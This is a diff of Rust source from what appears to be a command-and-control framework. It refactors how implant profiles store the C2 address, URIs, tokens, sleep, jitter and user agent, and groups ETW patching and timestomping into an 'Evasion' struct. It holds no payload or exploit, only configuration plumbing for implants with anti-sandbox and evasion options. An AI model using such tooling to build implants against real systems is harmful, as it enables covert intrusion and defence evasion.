@@ -11,41 +11,44 @@ use crate::logging::log_error_async;
 
 #[derive(Deserialize, Debug)]
 pub struct Profile {
-    pub sleep: Option<u64>,
-    pub useragent: Option<String>,
     pub server: Server,
-    pub listeners: BTreeMap<String, Listener>,
     pub implants: BTreeMap<String, Implant>,
 }
 
 #[derive(Deserialize, Debug)]
 pub struct Server {
-    pub uri: Vec<String>,
     pub token: String,
-    pub jitter: Option<u64>,
 }
 
 #[derive(Deserialize, Debug)]
-pub struct Listener {
+pub struct Network {
     pub address: String,
+    pub uri: Vec<String>,
     pub port: u16,
     pub token: Option<String>,
     pub sleep: Option<u64>,
-    pub protocol: String,
+    pub useragent: Option<String>,
+    pub jitter: Option<u64>,
 }
 
 #[derive(Deserialize, Debug)]
 pub struct Implant {
     pub anti_sandbox: Option<AntiSandbox>,
     pub debug: Option<bool>,
-    pub patch_etw: Option<bool>,
-    pub timestomp: Option<String>,
+    pub network: Network,
+    pub evasion: Evasion,
 }
 
 #[derive(Deserialize, Debug)]
 pub struct AntiSandbox {
     pub trig: Option<bool>,
     pub ram: Option<bool>,
+}
+
+#[derive(Deserialize, Debug)]
+pub struct Evasion {
+    pub patch_etw: Option<bool>,
+    pub timestomp: Option<String>,
 }
 
 impl Profile {
@@ -72,13 +75,6 @@ impl Profile {
         // In the event of an error, we want to return a WyrmResult::Err to indicate there was some form of failure.
         //
 
-        let listener = match self.listeners.get(listener_profile_name) {
-            Some(l) => l,
-            None => {
-                return WyrmResult::Err(format!("Could not find listener {listener_profile_name}"));
-            }
-        };
-
         let implant = match self.implants.get(implant_profile_name) {
             Some(i) => i,
             None => {
@@ -89,13 +85,13 @@ impl Profile {
         };
 
         let build_debug = implant.debug.unwrap_or_default();
-        let patch_etw = implant.patch_etw.unwrap_or_default();
+        let patch_etw = implant.evasion.patch_etw.unwrap_or_default();
 
         // Unwrap a sleep time from either profile specific, a higher order key, or if none found, use
         // a default of 1 hr (3600 seconds).
-        let sleep_time = match listener.sleep {
+        let sleep_time = match implant.network.sleep {
             Some(s) => s,
-            None => self.sleep.unwrap_or(3600),
+            None => 3600,
         };
 
         // Try cast to i64 from u64, checking the number stays the same
@@ -121,20 +117,20 @@ impl Profile {
             false
         };
 
-        let agent_security_token = if let Some(token) = &listener.token {
+        let agent_security_token = if let Some(token) = &implant.network.token {
             token.clone()
         } else {
             self.server.token.clone()
         };
 
-        let useragent = if let Some(ua) = &self.useragent {
+        let useragent = if let Some(ua) = &implant.network.useragent {
             ua.clone()
         } else {
             "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36".into()
         };
 
         // Validate we have at least 1 URI endpoint before insertion, otherwise error
-        if self.server.uri.is_empty() {
+        if implant.network.uri.is_empty() {
             return WyrmResult::Err(String::from("At least 1 URI is required for the server."));
         }
 
@@ -142,12 +138,12 @@ impl Profile {
             // TODO not required
             implant_name: String::new(),
             default_sleep_time,
-            c2_address: listener.address.clone(),
-            c2_endpoints: self.server.uri.clone(),
+            c2_address: implant.network.address.clone(),
+            c2_endpoints: implant.network.uri.clone(),
             // TODO not required
             staging_endpoint: String::new(),
             pe_name,
-            port: listener.port,
+            port: implant.network.port,
             agent_security_token,
             antisandbox_trig,
             antisandbox_ram,
@@ -155,8 +151,8 @@ impl Profile {
             build_debug,
             useragent,
             patch_etw,
-            jitter: self.server.jitter,
-            timestomp: implant.timestomp.clone(),
+            jitter: implant.network.jitter,
+            timestomp: implant.evasion.timestomp.clone(),
         })
     }
 }
@@ -231,14 +227,16 @@ pub async fn get_profile(needle: &str) -> io::Result<Profile> {
 
 pub fn add_listeners_from_profiles(existing: &mut HashSet<String>, new: &[Profile]) {
     for p in new.iter() {
-        for uri in &p.server.uri {
-            // Strip out the leading /
-            if uri.starts_with('/') {
-                let mut tmp = uri.clone();
-                tmp.remove(0);
-                existing.insert(tmp);
-            } else {
-                existing.insert(uri.clone());
+        for (_, implant) in p.implants.iter() {
+            for uri in &implant.network.uri {
+                // Strip out the leading /
+                if uri.starts_with('/') {
+                    let mut tmp = uri.clone();
+                    tmp.remove(0);
+                    existing.insert(tmp);
+                } else {
+                    existing.insert(uri.clone());
+                }
             }
         }
     }
@@ -249,8 +247,8 @@ pub fn add_tokens_from_profiles(existing: &mut HashSet<String>, new: &[Profile])
         // Add the default required token in the [server] attribute
         existing.insert(p.server.token.clone());
 
-        for listener in p.listeners.values() {
-            if let Some(tok) = &listener.token {
+        for i in p.implants.values() {
+            if let Some(tok) = &i.network.token {
                 existing.insert(tok.clone());
             }
         }
@@ -277,18 +275,6 @@ async fn read_profile(path: &Path) -> io::Result<Profile> {
             )));
         }
     };
-
-    // Check the protocol matches the valid protocol names we can have implants built for
-    for (name, listener) in &profile.listeners {
-        if !(listener.protocol.eq("http")
-            || listener.protocol.eq("https")
-            || listener.protocol.eq("smb"))
-        {
-            return Err(io::Error::other(format!(
-                "Listener type was missing when reading profile: {path:?}, profile name: {name}"
-            )));
-        }
-    }
 
     Ok(profile)
 }
